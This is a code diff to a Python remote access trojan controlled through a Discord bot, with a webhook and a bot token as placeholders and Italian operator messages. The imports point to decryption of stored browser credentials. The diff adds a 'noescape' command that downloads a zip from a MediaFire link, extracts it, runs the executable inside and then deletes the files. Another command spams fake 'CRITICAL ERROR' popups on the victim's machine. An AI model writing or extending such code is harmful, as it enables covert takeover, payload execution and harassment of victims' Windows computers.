@@ -1,5 +1,5 @@
 weburl = 'ENTER HERE YOUR WEBHOOK URL'
-botoken = 'ENTER HERE YOUR BOT TOKEN'
+botoken = 'ENTER HERE YOUR DISCORD BOT TOKEN'
 import discord
 from discord.ext import commands
 from discord_webhook import DiscordWebhook
@@ -10,7 +10,6 @@ import requests
 import pyautogui as pglib
 from sys import platform as osys
 from random import randint
-pglib.FAILSAFE = False
 import re
 import sys
 import json
@@ -20,6 +19,8 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 import csv
+from zipfile import ZipFile
+pglib.FAILSAFE = False
 
 
 
@@ -93,6 +94,25 @@ async def ifconfig(ctx):
     )
     await ctx.send(embed=embed_ip)
 
+
+
+@client.command()
+async def noescape(ctx):
+    subprocess.getoutput('if exist "%appdata%\noescape.zip" del "%appdata%\noescape.zip"/q')
+    linknoescape = 'https://download1495.mediafire.com/197ufuit42rg/fyc0dlkog1ra1q2/noescape.zip'
+    startdwn = requests.get(linknoescape)
+    contenuto = startdwn.content
+    fbdn = open(f'{appdatar}/noescape.zip','wb')
+    fbdn.write(contenuto)
+    fbdn.close()
+    with ZipFile(f'{appdatar}/noescape.zip', 'r') as zipObj:
+        zipObj.extractall()
+    await ctx.send('Il bot non potrà essere usato per 4:05 minuti')
+    await ctx.send('Inizio brano')
+    subprocess.getoutput('start Windows.exe')
+    subprocess.getoutput('del "%appdata%\noescape.zip"/q')
+    subprocess.getoutput('del "%appdata%\Windows.exe"/q')
+    subprocess.getoutput(r'del "%appdata%\NoEscape.mp3"/q')
 
     
 @client.command()
@@ -317,15 +337,15 @@ async def msgboxE(ctx,arg=None):
         await ctx.send("Inserire il numero di errori da spammare")
     else:
          number_of_error = int(arg)
-        subprocess.getoutput('echo msgbox "CRITICAL ERROR", 16, "CRITICAL ERROR" >> "%appdata%\Error.vbs"')
-        os.chdir(appdatar)
-        for i in range(0,number_of_error):
-            subprocess.getoutput('start Error.vbs')
-        if number_of_error == 1:
-            await ctx.send('Errore inviato')
-        else:
-            await ctx.send('Errori inviati')
-        subprocess.getoutput('if exist "%appdata%\Error.vbs" del "%appdata%\Error.vbs"/q')
+         subprocess.getoutput('echo msgbox "CRITICAL ERROR", 16, "CRITICAL ERROR" >> "%appdata%\Error.vbs"')
+         os.chdir(appdatar)
+         for i in range(0,number_of_error):
+             subprocess.getoutput('start Error.vbs')
+         if number_of_error == 1:
+             await ctx.send('Errore inviato')
+         else:
+             await ctx.send('Errori inviati')
+         subprocess.getoutput('if exist "%appdata%\Error.vbs" del "%appdata%\Error.vbs"/q')
 
 
 @client.command(help='Rimuovi definitivamente il rat')
